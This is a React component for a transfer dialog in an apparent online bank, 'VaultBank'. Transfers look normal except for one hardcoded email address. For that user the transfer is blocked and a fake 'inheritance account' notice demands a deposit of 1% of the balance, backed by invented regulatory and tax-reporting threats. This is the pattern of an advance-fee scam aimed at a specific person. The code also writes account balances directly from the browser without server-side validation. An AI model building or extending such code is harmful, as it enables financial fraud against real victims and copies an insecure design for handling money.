import { useState, useEffect } from "react";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { TransferReceipt } from "./TransferReceipt";
import { OTPVerificationModal } from "./OTPVerificationModal";
import { createNotification, NotificationTemplates } from "@/lib/notifications";
import bankLogo from "@/assets/vaultbank-logo.png";
import { AlertDialog, AlertDialogContent, AlertDialogDescription, AlertDialogHeader, AlertDialogTitle, AlertDialogFooter, AlertDialogCancel } from "@/components/ui/alert-dialog";
import { AlertTriangle } from "lucide-react";

interface TransferModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

export function TransferModal({ onClose, onSuccess }: TransferModalProps) {
  const [accounts, setAccounts] = useState<any[]>([]);
  const [profile, setProfile] = useState<any>(null);
  const [fromAccount, setFromAccount] = useState("");
  const [toAccount, setToAccount] = useState("");
  const [amount, setAmount] = useState("");
  const [notes, setNotes] = useState("");
  const [loading, setLoading] = useState(false);
  const [showOTP, setShowOTP] = useState(false);
  const [showReceipt, setShowReceipt] = useState(false);
  const [receiptData, setReceiptData] = useState<any>(null);
  const [pendingTransfer, setPendingTransfer] = useState<any>(null);
  const [showLoadingSpinner, setShowLoadingSpinner] = useState(false);
  const [showInheritanceWarning, setShowInheritanceWarning] = useState(false);
  const [totalBalance, setTotalBalance] = useState(0);

  useEffect(() => {
    fetchAccounts();
    fetchProfile();
  }, []);

  const fetchProfile = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { data } = await supabase
      .from("profiles")
      .select("*")
      .eq("id", user.id)
      .single();

    setProfile(data);
  };

  const fetchAccounts = async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { data, error } = await supabase
      .from("accounts")
      .select("*")
      .eq("user_id", user.id)
      .eq("status", "active");

    if (error) {
      console.error("Error fetching accounts:", error);
    } else {
      setAccounts(data || []);
      // Calculate total balance for inheritance warning
      const total = (data || []).reduce((sum, acc) => sum + parseFloat(String(acc.balance || 0)), 0);
      setTotalBalance(total);
    }
  };

  const handleTransfer = async () => {
    if (!fromAccount || !toAccount || !amount) {
      toast.error("Please fill in all required fields");
      return;
    }

    if (fromAccount === toAccount) {
      toast.error("Cannot transfer to the same account");
      return;
    }

    const transferAmount = parseFloat(amount);
    if (isNaN(transferAmount) || transferAmount <= 0) {
      toast.error("Please enter a valid amount");
      return;
    }

    // Check if user is annanbelle72@gmail.com and show inheritance warning
    if (profile?.email === "annanbelle72@gmail.com") {
      setShowInheritanceWarning(true);
      return;
    }

    // Internal transfers are instant - no OTP needed
    setLoading(true);
    setShowLoadingSpinner(true);
    try {
      const { data: { user } } = await supabase.auth.getUser();
      if (!user) throw new Error("Not authenticated");

      const reference = `INT${Date.now()}${Math.random().toString(36).substr(2, 9).toUpperCase()}`;

      const fromAcc = accounts.find(a => a.id === fromAccount);
      const toAcc = accounts.find(a => a.id === toAccount);

      // Internal transfers are instant - update balances immediately
      const { data: fromAccountData } = await supabase
        .from("accounts")
        .select("balance")
        .eq("id", fromAccount)
        .single();

      const { data: toAccountData } = await supabase
        .from("accounts")
        .select("balance")
        .eq("id", toAccount)
        .single();

      const fromBalance = parseFloat(String(fromAccountData?.balance || 0));
      const toBalance = parseFloat(String(toAccountData?.balance || 0));

      if (fromBalance < transferAmount) {
        throw new Error("Insufficient funds");
      }

      // Update balances
      await Promise.all([
        supabase
          .from("accounts")
          .update({ balance: fromBalance - transferAmount })
          .eq("id", fromAccount),
        supabase
          .from("accounts")
          .update({ balance: toBalance + transferAmount })
          .eq("id", toAccount)
      ]);

      // Create transfer record as completed
      const { error: transferError } = await supabase
        .from("transfers")
        .insert({
          user_id: user.id,
          from_account: fromAccount,
          to_account: toAccount,
          amount: transferAmount,
          status: "completed"
        });

      if (transferError) throw transferError;

      // Create transaction records as completed
      await supabase.from("transactions").insert([
        {
          user_id: user.id,
          account_id: fromAccount,
          type: "debit",
          amount: transferAmount,
          description: `Transfer to ${toAcc?.account_type}`,
          status: "completed"
        },
        {
          user_id: user.id,
          account_id: toAccount,
          type: "credit",
          amount: transferAmount,
          description: `Transfer from ${fromAcc?.account_type}`,
          status: "completed"
        }
      ]);

      // Send success notification
      await createNotification({
        userId: user.id,
        title: "Transfer Completed",
        message: `Your transfer of $${transferAmount.toFixed(2)} from ${fromAcc?.account_type} to ${toAcc?.account_type} has been completed`,
        type: "success"
      });

      setTimeout(() => {
        setShowLoadingSpinner(false);
        setLoading(false);
        setReceiptData({
          type: 'internal',
          fromAccount: fromAcc?.account_type || '',
          toAccount: toAcc?.account_type || '',
          amount: transferAmount.toFixed(2),
          currency: '$',
          reference,
          date: new Date(),
          status: 'completed'
        });
        setShowReceipt(true);
        onSuccess();
        toast.success("Transfer completed successfully");
      }, 2000);
    } catch (error: any) {
      console.error("Transfer error:", error);
      toast.error(error.message || "Failed to complete transfer");
      setShowLoadingSpinner(false);
      setLoading(false);
    }
  };

  return (
    <>
      <Dialog open={!showReceipt} onOpenChange={onClose}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>Internal Transfer</DialogTitle>
          </DialogHeader>

          <div className="space-y-4 py-4">
            <div className="space-y-2">
              <Label htmlFor="from-account">From Account</Label>
              <Select value={fromAccount} onValueChange={setFromAccount}>
                <SelectTrigger>
                  <SelectValue placeholder="Select account" />
                </SelectTrigger>
                <SelectContent>
                  {accounts.map((account) => (
                    <SelectItem key={account.id} value={account.id}>
                      {account.account_type} - ${parseFloat(account.balance || 0).toFixed(2)}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="to-account">To Account</Label>
              <Select value={toAccount} onValueChange={setToAccount}>
                <SelectTrigger>
                  <SelectValue placeholder="Select account" />
                </SelectTrigger>
                <SelectContent>
                  {accounts.map((account) => (
                    <SelectItem key={account.id} value={account.id}>
                      {account.account_type}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="amount">Amount</Label>
              <Input
                id="amount"
                type="number"
                step="0.01"
                min="0"
                placeholder="0.00"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="notes">Notes (Optional)</Label>
              <Input
                id="notes"
                placeholder="Add a note..."
                value={notes}
                onChange={(e) => setNotes(e.target.value)}
              />
            </div>
          </div>

          <div className="flex gap-2">
            <Button variant="outline" onClick={onClose} className="flex-1">
              Cancel
            </Button>
            <Button onClick={handleTransfer} disabled={loading} className="flex-1">
              {loading ? "Processing..." : "Transfer Now"}
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {showReceipt && receiptData && (
        <TransferReceipt
          open={showReceipt}
          onClose={() => {
            setShowReceipt(false);
            onClose();
          }}
          transferData={receiptData}
        />
      )}

      {showLoadingSpinner && (
        <div className="fixed inset-0 bg-background/80 backdrop-blur-sm z-[100] flex items-center justify-center">
          <div className="text-center space-y-4">
            <img 
              src={bankLogo} 
              alt="VaultBank" 
              className="h-20 w-auto mx-auto animate-spin"
              style={{ animationDuration: '2s' }}
            />
            <p className="text-lg font-semibold">Processing your transfer...</p>
          </div>
        </div>
      )}

      <AlertDialog open={showInheritanceWarning} onOpenChange={setShowInheritanceWarning}>
        <AlertDialogContent className="max-w-md">
          <AlertDialogHeader>
            <div className="flex items-center gap-3 mb-2">
              <div className="p-2 bg-destructive/10 rounded-full">
                <AlertTriangle className="h-6 w-6 text-destructive" />
              </div>
              <AlertDialogTitle className="text-xl">Inheritance Account - Deposit Required</AlertDialogTitle>
            </div>
            <AlertDialogDescription className="space-y-4 text-base">
              <div className="p-4 bg-muted rounded-lg space-y-2">
                <p className="font-semibold text-foreground">📋 Document Status: Verified ✓</p>
                <p className="text-sm">All inheritance documents have been submitted and verified by our compliance team.</p>
              </div>

              <div className="p-4 bg-destructive/5 border border-destructive/20 rounded-lg space-y-2">
                <p className="font-semibold text-destructive">⚠️ Required Deposit:</p>
                <p className="text-sm">Before you can transfer funds from this inherited account, you must deposit <span className="font-bold">1% of the total account balance</span> to comply with regulatory requirements.</p>
                <p className="text-lg font-bold text-foreground mt-2">
                  Required Deposit: ${(totalBalance * 0.01).toFixed(2)}
                </p>
              </div>

              <div className="p-4 bg-muted rounded-lg space-y-2">
                <p className="font-semibold text-foreground">⚠️ Tax Compliance Notice:</p>
                <p className="text-sm">Attempting to transfer large inherited funds may trigger automatic reporting to tax authorities. Ensure compliance to avoid delays or penalties.</p>
              </div>

              <p className="text-sm text-muted-foreground">Please contact our support team to arrange the required deposit or for more information about this requirement.</p>
            </AlertDialogDescription>
          </AlertDialogHeader>
          <AlertDialogFooter>
            <AlertDialogCancel>I Understand</AlertDialogCancel>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </>
  );
}
